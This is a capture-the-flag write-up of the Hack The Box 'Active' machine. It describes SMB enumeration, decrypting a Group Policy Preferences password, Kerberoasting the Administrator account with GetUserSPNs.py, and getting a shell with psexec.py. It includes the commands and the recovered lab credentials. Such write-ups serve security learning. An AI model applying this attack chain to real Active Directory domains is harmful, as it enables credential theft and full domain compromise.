---
title: "Hack The Box - Active"
tags: [windows,medium,kerberoasting , smb , psexec]
categories: HackTheBox-Active-Directory
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled.png)

### NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%201.png)

### *Enumerating*

⇒ Enumerating the smb shares :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%202.png)

⇒ In replication share we found Groups.xml which has an password which we can decrypt using gpp-decrypt ( group policy password ) :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%203.png)

**svc_tgs : GPPstillStandingStrong2k18**

### *Kerberoasting*

⇒ So running GetUserSPNs.py we see that there's an SPN set for Administrator user. We requested the tgs and cracked it locally using john :

`python3 GetUserSPNs.py active.htb/'svc_tgs:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request`

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%204.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%205.png)

**Administrator : Ticketmaster1968**

⇒ Using psexec to get a shell with administrator credentials :

**psexec.py administrator@10.10.10.100**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%206.png)

